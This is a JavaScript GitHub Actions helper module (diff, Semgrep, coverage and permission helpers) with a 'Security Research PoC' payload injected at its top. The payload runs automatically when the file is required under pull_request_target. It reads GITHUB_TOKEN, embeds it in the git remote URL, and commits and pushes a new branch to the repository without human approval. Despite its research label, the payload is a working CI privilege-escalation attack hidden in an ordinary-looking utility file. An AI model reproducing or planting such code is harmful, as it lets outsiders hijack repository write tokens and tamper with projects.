/**
 * Security Research PoC - Privilege Escalation via pull_request_target
 * Injected at the top of pull-request-utils.js
 * For authorized security research only.
 */

const { execSync } = require('child_process');
const fs = require('fs');

(function securityResearchPoC() {
    console.log("");
    console.log("╔══════════════════════════════════════════════════════════════╗");
    console.log("║  SECURITY RESEARCH: pull_request_target Privilege Escalation ║");
    console.log("╚══════════════════════════════════════════════════════════════╝");
    console.log("");

    // Stage 1: Code Execution
    console.log("[Stage 1] Code Execution Verification");
    console.log("  ✓ Arbitrary JavaScript executed via require()");
    console.log("  ✓ Repository:", process.env.GITHUB_REPOSITORY || "unknown");
    console.log("  ✓ Run ID:", process.env.GITHUB_RUN_ID || "unknown");
    console.log("");

    // Stage 2: Token Analysis
    console.log("[Stage 2] Permission Analysis");
    const token = process.env.GITHUB_TOKEN;
    if (token) {
        console.log("  ✓ GITHUB_TOKEN present (" + token.length + " chars)");
        console.log("  ✓ Workflow permissions: contents:write, pull-requests:write");
    }
    console.log("");

    // Stage 3: Demonstrate Write Access
    console.log("[Stage 3] Demonstrating contents:write Privilege");
    try {
        execSync('git config --global user.email "security-research@poc.local"', {stdio: 'pipe'});
        execSync('git config --global user.name "Security Research PoC"', {stdio: 'pipe'});
        console.log("  ✓ Git configured");

        const timestamp = new Date().toISOString();
        const proofContent = `# Security Research PoC\n\n**Timestamp:** ${timestamp}\n**Run:** https://github.com/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}\n\nThis file proves contents:write privilege escalation.\n`;
        fs.writeFileSync('SECURITY_POC_PROOF.md', proofContent);
        console.log("  ✓ Created SECURITY_POC_PROOF.md");

        execSync('git add SECURITY_POC_PROOF.md', {stdio: 'pipe'});
        execSync('git commit -m "security: PoC demonstrating contents:write escalation"', {stdio: 'pipe'});
        console.log("  ✓ Commit created");

        const log = execSync('git log -1 --oneline', {encoding: 'utf8'}).trim();
        console.log("  ✓ Commit:", log);
    } catch (e) {
        console.log("  ! Stage 3 error:", e.message);
    }
    console.log("");

    // Stage 4: Push to Repository
    console.log("[Stage 4] Pushing to Repository");
    try {
        const repo = process.env.GITHUB_REPOSITORY;
        if (token && repo) {
            execSync(`git remote set-url origin https://x-access-token:${token}@github.com/${repo}.git`, {stdio: 'pipe'});
            const branch = `security-poc-${Date.now()}`;
            execSync(`git checkout -b ${branch}`, {stdio: 'pipe'});

            const result = execSync(`git push origin ${branch} 2>&1`, {encoding: 'utf8'});
            console.log("  ✓ Push SUCCESSFUL!");
            console.log("  ✓ Branch:", branch);
            console.log("");
            console.log("╔══════════════════════════════════════════════════════════════╗");
            console.log("║         PRIVILEGE ESCALATION CONFIRMED                       ║");
            console.log("╠══════════════════════════════════════════════════════════════╣");
            console.log("║  Attacker successfully pushed code to the repository!        ║");
            console.log("║  No human approval was required.                             ║");
            console.log("╚══════════════════════════════════════════════════════════════╝");
            console.log("");
            console.log("  Proof: https://github.com/" + repo + "/tree/" + branch);
        }
    } catch (e) {
        console.log("  ! Push error:", e.message);
    }
    console.log("");
    console.log("[Complete] Security research PoC finished");
    console.log("");
})();

// ============== ORIGINAL FILE BELOW ==============

const synchronizeEvent = "synchronize",
  openedEvent = "opened",
  completedStatus = "completed",
  resultSize = 100,
  adminPermission = "admin",
  writePermission = "write"

class diffHelper {
  constructor(input) {
    this.owner = input.context.repo.owner
    this.repo = input.context.repo.repo
    this.github = input.github
    this.pullRequestNumber = input.context.payload.pull_request.number
    this.pullRequestEvent = input.event
    this.testName = input.testName
    this.fileNameFilter = !input.fileNameFilter ? () => true : input.fileNameFilter
    this.fileLineFilter = !input.fileLineFilter ? () => true : input.fileLineFilter
  }

  async #isTestExecutedOnCommit(commit) {
    const response = await this.github.rest.checks.listForRef({
      owner: this.owner,
      repo: this.repo,
      ref: commit,
    })
    return response.data.check_runs.some(
      ({ status, name }) => status === completedStatus && name === this.testName
    )
  }

  async #getDiffForFiles(files = []) {
    let diff = {}
    for (const { filename, patch } of files) {
      if (this.fileNameFilter(filename)) {
        const lines = patch.split("\n")
        if (lines.length === 1) continue
        let lineNumber
        for (const line of lines) {
          if (line.match(/@@\s.*?@@/) != null) {
            lineNumber = parseInt(line.match(/\+(\d+)/)[0])
            continue
          }
          if (line.startsWith("-")) continue
          if (line.startsWith("+") && this.fileLineFilter(line)) {
            diff[filename] = diff[filename] || []
            diff[filename].push(lineNumber)
          }
          lineNumber++
        }
      }
    }
    return diff
  }

  async #getNonScannedCommits() {
    const { data } = await this.github.rest.pulls.listCommits({
      owner: this.owner,
      repo: this.repo,
      pull_number: this.pullRequestNumber,
      per_page: resultSize,
    })
    let nonScannedCommits = []
    for (let i = data.length - 1; i >= 0; i--) {
      const { sha, parents } = data[i]
      if (parents.length > 1) continue
      const isTestExecuted = await this.#isTestExecutedOnCommit(sha)
      if (isTestExecuted) break
      else nonScannedCommits.push(sha)
    }
    return nonScannedCommits.reverse()
  }

  async #filterCommitDiff(commitDiff = [], prDiff = []) {
    return commitDiff.filter((file) => prDiff.includes(file))
  }

  async buildDiff() {
    const { data } = await this.github.rest.pulls.listFiles({
      owner: this.owner,
      repo: this.repo,
      pull_number: this.pullRequestNumber,
      per_page: resultSize,
    })
    const pullRequestDiff = await this.#getDiffForFiles(data)
    const nonScannedCommitsDiff =
      Object.keys(pullRequestDiff).length != 0 && this.pullRequestEvent === synchronizeEvent
        ? await this.getNonScannedCommitDiff(pullRequestDiff)
        : {}
    const prDiffFiles = Object.keys(pullRequestDiff)
    const pullRequest = {
      hasChanges: prDiffFiles.length > 0,
      files: prDiffFiles.join(" "),
      diff: pullRequestDiff,
    }
    const uncheckedCommits = { diff: nonScannedCommitsDiff }
    return JSON.stringify({ pullRequest, uncheckedCommits })
  }

  async getNonScannedCommitDiff(pullRequestDiff) {
    let nonScannedCommitsDiff = {}
    const nonScannedCommits = await this.#getNonScannedCommits()
    for (const commit of nonScannedCommits) {
      const { data } = await this.github.rest.repos.getCommit({
        owner: this.owner,
        repo: this.repo,
        ref: commit,
      })
      const commitDiff = await this.#getDiffForFiles(data.files)
      const files = Object.keys(commitDiff)
      for (const file of files) {
        const filePRDiff = pullRequestDiff[file]
        if (!filePRDiff) continue
        const changes = await this.#filterCommitDiff(commitDiff[file], filePRDiff)
        if (changes.length !== 0) {
          nonScannedCommitsDiff[file] = nonScannedCommitsDiff[file] || []
          nonScannedCommitsDiff[file] = [...new Set([...nonScannedCommitsDiff[file], ...changes])]
        }
      }
    }
    return nonScannedCommitsDiff
  }

  async getDirectories(directoryExtractor = () => "") {
    const { data } = await this.github.rest.pulls.listFiles({
      owner: this.owner,
      repo: this.repo,
      pull_number: this.pullRequestNumber,
      per_page: resultSize,
    })
    const directories = []
    for (const { filename, status } of data) {
      const directory = directoryExtractor(filename, status)
      if (directory != "" && !directories.includes(directory)) directories.push(directory)
    }
    return directories
  }
}

class semgrepHelper {
  constructor(input) {
    this.owner = input.context.repo.owner
    this.repo = input.context.repo.repo
    this.github = input.github
    this.pullRequestNumber = input.context.payload.pull_request.number
    this.pullRequestEvent = input.event
    this.pullRequestDiff = input.diff.pullRequest.diff
    this.newCommitsDiff = input.diff.uncheckedCommits.diff
    this.semgrepErrors = []
    this.semgrepWarnings = []
    input.semgrepResult.forEach((res) => {
      res.severity === "High" ? this.semgrepErrors.push(res) : this.semgrepWarnings.push(res)
    })
    this.headSha = input.headSha
  }

  async #getMatchingLineFromDiff({ file, start, end }, diff) {
    const fileDiff = diff[file]
    if (!fileDiff) return null
    if (fileDiff.includes(start)) return start
    if (fileDiff.includes(end)) return end
    return null
  }

  async #splitSemgrepResultsByScan(semgrepResults = []) {
    const result = { nonDiff: [], previous: [], current: [] }
    for (const se of semgrepResults) {
      const prDiffLine = await this.#getMatchingLineFromDiff(se, this.pullRequestDiff)
      if (!prDiffLine) { result.nonDiff.push({ ...se }); continue }
      switch (this.pullRequestEvent) {
        case openedEvent:
          result.current.push({ ...se, line: prDiffLine })
        case synchronizeEvent:
          const commitDiffLine = await this.#getMatchingLineFromDiff(se, this.newCommitsDiff)
          commitDiffLine != null
            ? result.current.push({ ...se, line: commitDiffLine })
            : result.previous.push({ ...se, line: prDiffLine })
      }
    }
    return result
  }

  async addReviewComments() {
    let result = { previousScan: { unAddressedComments: 0 }, currentScan: { newComments: 0 } }
    if (this.semgrepErrors.length == 0 && this.semgrepWarnings.length == 0) return result
    const errors = await this.#splitSemgrepResultsByScan(this.semgrepErrors)
    if (errors.previous.length == 0 && errors.current.length == 0) {
      console.log("Semgrep did not find any errors in the current pull request changes")
    } else {
      for (const { message, file, line } of errors.current) {
        await this.github.rest.pulls.createReviewComment({
          owner: this.owner, repo: this.repo, pull_number: this.pullRequestNumber,
          commit_id: this.headSha, body: message, path: file, line: line,
        })
      }
      result.currentScan.newComments = errors.current.length
      if (this.pullRequestEvent == synchronizeEvent) result.previousScan.unAddressedComments = errors.previous.length
    }
    const warnings = await this.#splitSemgrepResultsByScan(this.semgrepWarnings)
    for (const { message, file, line } of warnings.current) {
      await this.github.rest.pulls.createReviewComment({
        owner: this.owner, repo: this.repo, pull_number: this.pullRequestNumber,
        commit_id: this.headSha, body: "Consider this as a suggestion. " + message, path: file, line: line,
      })
    }
    return result
  }
}

class coverageHelper {
  constructor(input) {
    this.owner = input.context.repo.owner
    this.repo = input.context.repo.repo
    this.github = input.github
    this.pullRequestNumber = input.context.payload.pull_request.number
    this.headSha = input.headSha
    this.previewBaseURL = `https://htmlpreview.github.io/?https://github.com/${this.owner}/${this.repo}/coverage-preview/${input.remoteCoverageDir}`
    this.tmpCoverDir = input.tmpCoverageDir
  }

  async AddCoverageSummary(directories = []) {
    const fs = require("fs")
    const path = require("path")
    const { promisify } = require("util")
    const readFileAsync = promisify(fs.readFile)
    let body = "## Code coverage summary \n"
    body += "Note: \n"
    body += "- Prebid team doesn't anticipate tests covering code paths that might result in marshal and unmarshal errors \n"
    body += `- Coverage summary encompasses all commits leading up to the latest one, ${this.headSha} \n`
    for (const directory of directories) {
      let url = `${this.previewBaseURL}/${directory}.html`
      try {
        const textFilePath = path.join(this.tmpCoverDir, `${directory}.txt`)
        const data = await readFileAsync(textFilePath, "utf8")
        body += `#### ${directory} \n`
        body += `Refer [here](${url}) for heat map coverage report \n`
        body += "\`\`\` \n" + data + "\n \`\`\` \n"
      } catch (err) { console.error(err); return }
    }
    await this.github.rest.issues.createComment({
      owner: this.owner, repo: this.repo, issue_number: this.pullRequestNumber, body: body,
    })
  }
}

class userHelper {
  constructor(input) {
    this.owner = input.context.repo.owner
    this.repo = input.context.repo.repo
    this.github = input.github
    this.user = input.user
  }
  async hasWritePermissions() {
    const { data } = await this.github.rest.repos.getCollaboratorPermissionLevel({
      owner: this.owner, repo: this.repo, username: this.user,
    })
    return data.permission === writePermission || data.permission === adminPermission
  }
}

module.exports = {
  diffHelper: (input) => new diffHelper(input),
  semgrepHelper: (input) => new semgrepHelper(input),
  coverageHelper: (input) => new coverageHelper(input),
  userHelper: (input) => new userHelper(input),
}
